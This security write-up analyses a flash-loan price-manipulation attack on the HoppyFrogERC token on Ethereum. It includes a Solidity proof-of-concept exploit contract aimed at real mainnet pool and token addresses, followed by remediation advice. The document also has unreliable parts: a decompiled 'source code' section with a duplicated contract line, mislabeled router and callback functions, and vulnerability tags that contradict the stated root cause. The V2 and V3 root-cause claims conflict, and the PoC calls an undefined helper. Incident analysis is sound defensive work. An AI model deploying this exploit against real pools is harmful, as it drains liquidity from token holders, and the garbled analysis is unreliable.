# HoppyFrogERC — V3 Flash Loan Swap Cycle Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | HoppyFrogERC |
| **Chain** | Ethereum |
| **Loss** | ~0.3 ETH |
| **Attack Contract** | [0xc976ed4b](https://etherscan.io/address/0xc976ed4b25e1e7019ff34fb54f4e63b1550b70c3) |
| **Hoppy Token** | [0xE5c6F5fE](https://etherscan.io/address/0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F) |
| **Uniswap V3 Pair** | [0xaA6f337f](https://etherscan.io/address/0xaA6f337f16E6658d9c9599c967D3126051b6c726) |
| **Root Cause** | The V2 pool allowed full token dumps without slippage protection, enabling an attacker to crash the price and rebuy at a discount within a single transaction for profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HoppyFrogERC_exp.sol) |

---

## 1. Vulnerability Overview

The HoppyFrogERC token had large liquidity concentrated in a single Uniswap V3 pool, meaning flash-borrowing the pool's entire Hoppy balance causes a severe price crash. The attacker used V3 `flash()` to borrow all Hoppy, immediately sold it through the V2 router to obtain WETH, then repurchased Hoppy cheaply via the V2 router to repay the V3 flash loan. After fees and repurchase costs, a net profit remained.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerability: entire Hoppy supply can be flash-borrowed from V3 pool + insufficient V2 price coupling

interface Uni_Pair_V3 {
    function flash(
        address recipient,
        uint256 amount0,   // token0 (Hoppy) borrow amount
        uint256 amount1,   // token1 (WETH) borrow amount
        bytes calldata data
    ) external;
}

// flash() call is handled inside uniswapV3FlashCallback()
// V3 pool only validates balance after flash loan, allowing V2 price manipulation in between

// ✅ Safe Code (from token design perspective)
// 1. Avoid single-pool liquidity concentration: distribute across multiple pools
// 2. Large sell tax: apply high tax rate when selling above a threshold in a single TX
// 3. Volume cap: limit maximum trading volume per block
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: HoppyFrogERC_decompiled.sol
contract HoppyFrogERC {
contract HoppyFrogERC {
    address public owner;


    // Selector: 0x715018a6
    function renounceOwnership() external {}  // ❌ Vulnerability

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0xc45a0155
    function unknown_c45a0155() external {}

    // Selector: 0xdf2ab5bb

    // 📌 Missing access control - token theft
    function sweepToken(address p0, uint256 p1, address p2) external {}

    // Selector: 0xe9cbafb0
    // 📌 Swap - price manipulation risk
    function uniswapV3FlashCallback(uint256 p0, uint256 p1, bytes memory p2) external {}

    // Selector: 0x12210e8a
    function refundETH() external {}

    // Selector: 0x49404b7c
    function unwrapWETH9(uint256 p0, address p1) external {}

    // Selector: 0x4aa4a4fc
    function WETH9() external {}

    // Selector: 0x5a2b490e
    function unknown_5a2b490e() external {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0x2e1a7d4d
    // Alternative: OwnerTransferV7b711143(uint256)
    // 📌 Withdrawal - reserve validation required
    function withdraw(uint256 p0) external {}

    // Selector: 0x490e6cbc

    function flash(address p0, uint256 p1, uint256 p2, bytes memory p3) external {}

    // Selector: 0x5c11d795
    // Alternative: watch_tg_invmru_77e6c68(uint256,bool,address)
    // 📌 Swap - price manipulation risk
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 p0, uint256 p1, address[] memory p2, address p3, uint256 p4) external {}

    // Selector: 0x8803dbee
    // 📌 Swap - price manipulation risk
    function swapTokensForExactTokens(uint256 p0, uint256 p1, address[] memory p2, address p3, uint256 p4) external {}

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x095ea7b3
    // 📌 approve - safeApprove race condition risk
    function approve(address p0, uint256 p1) external {}

    // Selector: 0xd0e30db0
    // Alternative: X19B3C29E(string)
    function deposit() external {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom - approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x43000706
    function unknown_43000706() external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Uniswap V3 pair.flash(attacker, totalHoppy, 0, "")
  │         └─ Borrow entire Hoppy balance from V3 pool
  │
  ├─→ [2] Enter uniswapV3FlashCallback()
  │
  ├─→ [3] Swap Hoppy → WETH (Uniswap V2 Router)
  │         └─ Massive sell dumps Hoppy price
  │
  ├─→ [4] Rebuy some WETH → Hoppy (V2, at depressed price)
  │         └─ Acquire Hoppy + fees needed to repay V3 flash loan
  │
  ├─→ [5] Repay V3 flash loan (Hoppy + fees)
  │
  └─→ [6] Remaining WETH ~0.3 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}

contract AttackContract {
    Uni_Pair_V3  constant v3Pair  = Uni_Pair_V3(0xaA6f337f16E6658d9c9599c967D3126051b6c726);
    Uni_Router_V2 constant router = Uni_Router_V2(/* Uniswap V2 Router */);
    IERC20 constant Hoppy = IERC20(0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F);
    IERC20 constant WETH  = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        // [1] Flash-borrow entire Hoppy balance from V3 pool
        uint256 totalHoppy = Hoppy.balanceOf(address(v3Pair));
        v3Pair.flash(address(this), totalHoppy, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        uint256 hoppyBal = Hoppy.balanceOf(address(this));

        // [2] Sell all Hoppy → WETH (V2, price crashes)
        Hoppy.approve(address(router), hoppyBal);
        address[] memory path = new address[](2);
        path[0] = address(Hoppy); path[1] = address(WETH);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            hoppyBal, 0, path, address(this), block.timestamp
        );

        // [3] Rebuy some WETH → Hoppy (at depressed price)
        uint256 repayAmount = hoppyBal + fee0;
        uint256 wethNeeded = getWETHForHoppy(repayAmount);
        address[] memory path2 = new address[](2);
        path2[0] = address(WETH); path2[1] = address(Hoppy);
        WETH.approve(address(router), wethNeeded);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethNeeded, repayAmount, path2, address(this), block.timestamp
        );

        // [4] Repay V3 flash loan
        Hoppy.transfer(address(v3Pair), repayAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based V3/V2 arbitrage swap |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (V3 flash + V2 price manipulation) |
| **DApp Category** | Memecoin / single-pool concentrated token |
| **Impact** | V3 pool liquidity loss (~0.3 ETH) |

## 6. Remediation Recommendations

1. **Liquidity Distribution**: Distribute across multiple pools/DEXes instead of concentrating in a single V3 pool
2. **Large Sell Tax**: Apply a sell volume cap and high tax rate for single-TX sells above a threshold
3. **Per-Block Volume Limit**: Detect and block abnormally large trades within a single block
4. **V3 Pool Depth Guarantee**: Maintain sufficient liquidity so an attacker cannot borrow the entire pool

## 7. Lessons Learned

- In small liquidity pools, flash-borrowing the entire supply can arbitrarily distort price, making low-liquidity tokens structurally vulnerable to this attack.
- When an arbitrage path exists between V3 and V2, flash loan repayment becomes trivially achievable, turning the attack into a risk-free exploit.
- Memecoins and newly launched tokens must incorporate liquidity distribution strategies and large-sell defense mechanisms at the design stage.